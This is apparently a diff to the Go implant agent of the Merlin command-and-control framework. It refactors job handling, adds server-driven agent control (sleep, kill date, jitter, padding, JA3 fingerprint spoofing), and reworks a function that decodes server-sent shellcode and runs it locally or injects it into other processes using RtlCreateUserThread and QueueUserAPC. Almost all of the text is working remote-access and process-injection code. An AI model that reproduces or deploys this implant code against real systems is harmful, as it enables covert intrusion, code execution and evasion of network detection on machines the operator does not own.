+			a.outChan <- jobs.Job{
+				ID:      job.ID,
+				AgentID: a.ID,
+				Token:   job.Token,
+				Type:    jobs.FILETRANSFER,
+				Payload: fileTransferMessage,
+			}
+			return
+		}
+	default:
+		results.Stderr = fmt.Sprintf("%s is not a valid module type", cmd.Command)
 	}
 
 	if a.Verbose {
-		message("info", fmt.Sprintf("Shelcode execution method: %s", shellcode.Method))
+		if results.Stderr == "" {
+			message("success", results.Stdout)
+
+		} else {
+			message("warn", results.Stderr)
+		}
+	}
+
+	a.outChan <- jobs.Job{
+		ID:      job.ID,
+		AgentID: a.ID,
+		Token:   job.Token,
+		Type:    jobs.RESULT,
+		Payload: results,
+	}
+}
+
+// agentControl makes configuration changes to the agent
+func (a *Agent) agentControl(job jobs.Job) {
+	cmd := job.Payload.(jobs.Command)
+	if a.Verbose {
+		message("note", fmt.Sprintf("Received Agent Control Message: %s", cmd.Command))
+	}
+	var results jobs.Results
+
+	switch cmd.Command {
+	case "kill":
+		os.Exit(0)
+	case "sleep":
+		if a.Verbose {
+			message("note", fmt.Sprintf("Setting agent sleep time to %s", cmd.Args))
+		}
+		t, err := time.ParseDuration(cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error changing the agent waitTime:\r\n%s", err.Error())
+			break
+		}
+		if t >= 0 {
+			a.WaitTime = t
+		} else {
+			results.Stderr = fmt.Sprintf("the agent was provided with a time that was not greater than or equal to zero:\r\n%s", t.String())
+			break
+		}
+	case "skew":
+		t, err := strconv.ParseInt(cmd.Args[0], 10, 64)
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error changing the agent skew interval:\r\n%s", err.Error())
+			break
+		}
+		if a.Verbose {
+			message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
+		}
+		a.Skew = t
+	case "padding":
+		t, err := strconv.Atoi(cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error changing the agent message padding size:\r\n%s", err.Error())
+			break
+		}
+		if a.Verbose {
+			message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
+		}
+		a.PaddingMax = t
+	case "initialize":
+		if a.Verbose {
+			message("note", "Received agent re-initialize message")
+		}
+		a.initial = false
+	case "maxretry":
+		t, err := strconv.Atoi(cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("There was an error changing the agent max retries:\r\n%s", err.Error())
+			break
+		}
+		if a.Verbose {
+			message("note", fmt.Sprintf("Setting agent max retries to %d", t))
+		}
+		a.MaxRetry = t
+	case "killdate":
+		d, err := strconv.Atoi(cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error converting the kill date to an integer:\r\n%s", err.Error())
+			break
+		}
+		a.KillDate = int64(d)
+		if a.Verbose {
+			message("info", fmt.Sprintf("Set Kill Date to: %s",
+				time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
+		}
+	case "ja3":
+		a.JA3 = strings.Trim(cmd.Args[0], "\"'")
+
+		//Update the client
+		var err error
+
+		a.Client, err = getClient(a.Proto, "", a.JA3)
+
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error setting the agent client:\r\n%s", err.Error())
+		}
+
+		if a.Verbose && a.JA3 != "" {
+			message("note", fmt.Sprintf("Set agent JA3 signature to:%s", a.JA3))
+		} else if a.Verbose && a.JA3 == "" {
+			message("note", fmt.Sprintf("Setting agent client back to default using %s protocol", a.Proto))
+		}
+	default:
+		results.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", cmd.Command)
+	}
+
+	if results.Stderr != "" {
+		a.outChan <- jobs.Job{
+			ID:      job.ID,
+			AgentID: a.ID,
+			Token:   job.Token,
+			Type:    jobs.RESULT,
+			Payload: results,
+		}
+		return
+	}
+	if a.Verbose {
+		if results.Stderr != "" {
+			message("warn", results.Stderr)
+		}
+		if results.Stdout != "" {
+			message("success", results.Stdout)
+
+		}
+	}
+
+	a.getAgentInfoMessage(job)
+}
+
+// executeShellcode instructs the agent to load and run shellcode according to the input job
+func (a *Agent) executeShellcode(job jobs.Job) {
+	cmd := job.Payload.(jobs.Shellcode)
+	var results jobs.Results
+	if a.Debug {
+		message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %+v", job))
+	}
+
+	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(cmd.Bytes)
+
+	if errDecode != nil {
+		results.Stderr = fmt.Sprintf("there was an error decoding the shellcode Base64 string:\r\n%s", errDecode)
+		if a.Verbose {
+			message("warn", results.Stderr)
+		}
+		a.outChan <- jobs.Job{
+			ID:      job.ID,
+			AgentID: a.ID,
+			Token:   job.Token,
+			Type:    jobs.RESULT,
+			Payload: results,
+		}
+		return
+	}
+
+	if a.Verbose {
+		message("info", fmt.Sprintf("Shelcode execution method: %s", cmd.Method))
 	}
 	if a.Debug {
 		message("info", fmt.Sprintf("Executing shellcode %s", shellcodeBytes))
 	}
 
-	if shellcode.Method == "self" {
+	switch cmd.Method {
+	case "self":
 		err := ExecuteShellcodeSelf(shellcodeBytes)
 		if err != nil {
-			if a.Verbose {
-				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
-				message("warn", fmt.Sprintf("Error: %s", err.Error()))
-			}
-		} else {
-			if a.Verbose {
-				message("success", "Shellcode was successfully executed")
-			}
+			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"self\" method:\r\n%s", err)
 		}
-		return err
-	} else if shellcode.Method == "remote" {
-		err := ExecuteShellcodeRemote(shellcodeBytes, shellcode.PID)
+	case "remote":
+		err := ExecuteShellcodeRemote(shellcodeBytes, cmd.PID)
 		if err != nil {
-			if a.Verbose {
-				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
-				message("warn", fmt.Sprintf("Error: %s", err.Error()))
-			}
-		} else {
-			if a.Verbose {
-				message("success", "Shellcode was successfully executed")
-			}
+			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"remote\" method:\r\n%s", err)
 		}
-		return err
-	} else if shellcode.Method == "rtlcreateuserthread" {
-		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, shellcode.PID)
+	case "rtlcreateuserthread":
+		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, cmd.PID)
 		if err != nil {
-			if a.Verbose {
-				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
-				message("warn", fmt.Sprintf("Error: %s", err.Error()))
-			}
-		} else {
-			if a.Verbose {
-				message("success", "Shellcode was successfully executed")
-			}
+			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"rtlcreateuserthread\" method:\r\n%s", err)
 		}
-		return err
-	} else if shellcode.Method == "userapc" {
-		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, shellcode.PID)
+	case "userapc":
+		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, cmd.PID)
 		if err != nil {
-			if a.Verbose {
-				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
-				message("warn", fmt.Sprintf("Error: %s", err.Error()))
-			}
+			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"userapc\" method:\r\n%s", err)
+		}
+	default:
+		results.Stderr = fmt.Sprintf("invalid shellcode execution method: %s", cmd.Method)
+	}
+	if results.Stderr == "" {
+		results.Stdout = fmt.Sprintf("Shellcode %s method successfully executed", cmd.Method)
+	}
+	if a.Verbose {
+		if results.Stderr == "" {
+			message("success", results.Stdout)
 		} else {
-			if a.Verbose {
-				message("success", "Shellcode was successfully executed")
-			}
+			message("warn", results.Stderr)
 		}
-		return err
-	} else {
-		if a.Verbose {
-			message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", shellcode.Method))
-		}
-		return fmt.Errorf("invalid shellcode execution method %s", shellcode.Method)
+	}
+	a.outChan <- jobs.Job{
+		ID:      job.ID,
+		AgentID: a.ID,
+		Token:   job.Token,
+		Type:    jobs.RESULT,
+		Payload: results,
 	}
 }
 
+// list gets and returns a list of files and directories from the input file path
 func (a *Agent) list(path string) (string, error) {
 	if a.Debug {
 		message("debug", fmt.Sprintf("Received input parameter for list command function: %s", path))
@@ -1192,11 +1308,15 @@ func (a *Agent) opaqueRegister() error {
 	}
 
 	// Message to be sent to the server
+	regInit := opaque.Opaque{
+		Type:    opaque.RegInit,
+		Payload: userRegInitBytes,
+	}
 	regInitBase := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
-		Type:    "RegInit",
-		Payload: userRegInitBytes,
+		Type:    messages.OPAQUE,
+		Payload: regInit,
 		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
 
@@ -1217,13 +1337,16 @@ func (a *Agent) opaqueRegister() error {
 		return fmt.Errorf("there was an error sending the agent OPAQUE user registration initialization message:\r\n%s", errRegInitResp.Error())
 	}
 
-	if regInitResp.Type != "RegInit" {
-		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration initialization", regInitResp.Type)
+	if regInitResp.Type != messages.OPAQUE {
+		return fmt.Errorf("expected OPAQUE message, recieved %s", messages.String(regInitResp.Type))
+	}
+	if regInitResp.Payload.(opaque.Opaque).Type != opaque.RegInit {
+		return fmt.Errorf("expected OPAQUE message type: %d, recieved: %d", opaque.RegInit, regInitResp.Payload.(opaque.Opaque).Type)
 	}
 
 	var serverRegInit gopaque.ServerRegisterInit
 
-	errServerRegInit := serverRegInit.FromBytes(gopaque.CryptoDefault, regInitResp.Payload.([]byte))
+	errServerRegInit := serverRegInit.FromBytes(gopaque.CryptoDefault, regInitResp.Payload.(opaque.Opaque).Payload)
 	if errServerRegInit != nil {
 		return fmt.Errorf("there was an error unmarshalling the OPAQUE server register initialization message from bytes:\r\n%s", errServerRegInit.Error())
 	}
@@ -1252,11 +1375,15 @@ func (a *Agent) opaqueRegister() error {
 	}
 
 	// message to be sent to the server
+	regComplete := opaque.Opaque{
+		Type:    opaque.RegComplete,
+		Payload: userRegCompleteBytes,
+	}
 	regCompleteBase := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
-		Type:    "RegComplete",
-		Payload: userRegCompleteBytes,
+		Type:    messages.OPAQUE,
+		Payload: regComplete,
 		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
 
@@ -1266,8 +1393,11 @@ func (a *Agent) opaqueRegister() error {
 		return fmt.Errorf("there was an error sending the agent OPAQUE user registration complete message:\r\n%s", errRegCompleteResp.Error())
 	}
 
-	if regCompleteResp.Type != "RegComplete" {
-		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration complete", regCompleteResp.Type)
+	if regCompleteResp.Type != messages.OPAQUE {
+		return fmt.Errorf("expected OPAQUE message, recieved %s", messages.String(regInitResp.Type))
+	}
+	if regCompleteResp.Payload.(opaque.Opaque).Type != opaque.RegComplete {
+		return fmt.Errorf("expected OPAQUE message type: %d, recieved: %d", opaque.RegComplete, regInitResp.Payload.(opaque.Opaque).Type)
 	}
 
 	if a.Verbose {
@@ -1300,11 +1430,15 @@ func (a *Agent) opaqueAuthenticate() error {
 	}
 
 	// message to be sent to the server
+	authInit := opaque.Opaque{
+		Type:    opaque.AuthInit,
+		Payload: userAuthInitBytes,
+	}
 	authInitBase := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
-		Type:    "AuthInit",
-		Payload: userAuthInitBytes,
+		Type:    messages.OPAQUE,
+		Payload: authInit,
 		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
 
@@ -1325,8 +1459,12 @@ func (a *Agent) opaqueAuthenticate() error {
 		return fmt.Errorf("there was an error sending the agent OPAQUE authentication initialization message:\r\n%s", errAuthInitResp.Error())
 	}
 
+	if authInitResp.Type != messages.OPAQUE {
+		return fmt.Errorf("expected OPAQUE message, recieved %s", messages.String(authInitResp.Type))
+	}
+
 	// When the Merlin server has restarted but doesn't know the agent
-	if authInitResp.Type == "ReRegister" {
+	if authInitResp.Payload.(opaque.Opaque).Type == opaque.ReRegister {
 		if a.Verbose {
 			message("note", "Received OPAQUE ReRegister response, setting initial to false")
 		}
@@ -1334,14 +1472,14 @@ func (a *Agent) opaqueAuthenticate() error {
 		return nil
 	}
 
-	if authInitResp.Type != "AuthInit" {
-		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user authentication initialization", authInitResp.Type)
+	if authInitResp.Payload.(opaque.Opaque).Type != opaque.AuthInit {
+		return fmt.Errorf("expected OPAQUE message type: %d, recieved: %d", opaque.AuthInit, authInitResp.Payload.(opaque.Opaque).Type)
 	}
 
 	// 3 - Receive the server's ServerAuthComplete
 	var serverComplete gopaque.ServerAuthComplete
 
-	errServerComplete := serverComplete.FromBytes(gopaque.CryptoDefault, authInitResp.Payload.([]byte))
+	errServerComplete := serverComplete.FromBytes(gopaque.CryptoDefault, authInitResp.Payload.(opaque.Opaque).Payload)
 	if errServerComplete != nil {
 		return fmt.Errorf("there was an error unmarshalling the OPAQUE server complete message from bytes:\r\n%s", errServerComplete.Error())
 	}
@@ -1370,11 +1508,15 @@ func (a *Agent) opaqueAuthenticate() error {
 		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication complete message to bytes:\r\n%s", errUserAuthCompleteBytes.Error())
 	}
 
+	authComplete := opaque.Opaque{
+		Type:    opaque.AuthComplete,
+		Payload: userAuthCompleteBytes,
+	}
 	authCompleteBase := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
-		Type:    "AuthComplete",
-		Payload: &userAuthCompleteBytes,
+		Type:    messages.OPAQUE,
+		Payload: authComplete,
 		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
 
@@ -1393,18 +1535,18 @@ func (a *Agent) opaqueAuthenticate() error {
 	}
 
 	switch authCompleteResp.Type {
-	case "ServerOk":
+	case messages.JOBS:
 		if a.Verbose {
 			message("success", "Agent authentication successful")
 		}
+		a.messageHandler(authCompleteResp)
 		if a.Debug {
 			message("debug", "Leaving agent.opaqueAuthenticate without error")
 		}
 		return nil
 	default:
-		return fmt.Errorf("received unexpected or unrecognized message type during OPAQUE authentication completion:\r\n%s", authCompleteResp.Type)
+		return fmt.Errorf("received unexpected or unrecognized message type during OPAQUE authentication completion:\r\n%s", messages.String(authCompleteResp.Type))
 	}
-
 }
 
 // rsaKeyExchange is use to create and exchange RSA keys with the server
@@ -1420,7 +1562,7 @@ func (a *Agent) rsaKeyExchange() error {
 	m := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
-		Type:    "KeyExchange",
+		Type:    messages.KEYEXCHANGE,
 		Payload: pk,
 		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
@@ -1433,11 +1575,7 @@ func (a *Agent) rsaKeyExchange() error {
 	}
 
 	// Handle KeyExchange response from server
-	_, errKeyExchange := a.messageHandler(resp)
-
-	if errKeyExchange != nil {
-		return fmt.Errorf("there was an error handling the RSA key exchange response message:\r\n%s", errKeyExchange)
-	}
+	a.messageHandler(resp)
 
 	if a.Debug {
 		message("debug", "Leaving rsaKeyExchange function without error")
@@ -1488,7 +1626,7 @@ func (a *Agent) getJWT() (string, error) {
 }
 
 // getAgentInfoMessage is used to place of the information about an agent and it's configuration into a message and return it
-func (a *Agent) getAgentInfoMessage() messages.Base {
+func (a *Agent) getAgentInfoMessage(job jobs.Job) {
 	sysInfoMessage := messages.SysInfo{
 		Platform:     a.Platform,
 		Architecture: a.Architecture,
@@ -1513,15 +1651,13 @@ func (a *Agent) getAgentInfoMessage() messages.Base {
 		JA3:           a.JA3,
 	}
 
-	baseMessage := messages.Base{
-		Version: 1.0,
-		ID:      a.ID,
-		Type:    "AgentInfo",
+	a.outChan <- jobs.Job{
+		ID:      job.ID,
+		AgentID: a.ID,
+		Token:   job.Token,
+		Type:    jobs.AGENTINFO,
 		Payload: agentInfoMessage,
-		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
-
-	return baseMessage
 }
 
 // TODO centralize this into a package because it is used here and in the server
@@ -1545,5 +1681,4 @@ func message(level string, message string) {
 
 // TODO add cert stapling
 // TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
-// TODO Add standard function for printing messages like in the JavaScript agent. Make it a lib for agent and server?
 // TODO configure set UserAgent agentcontrol message
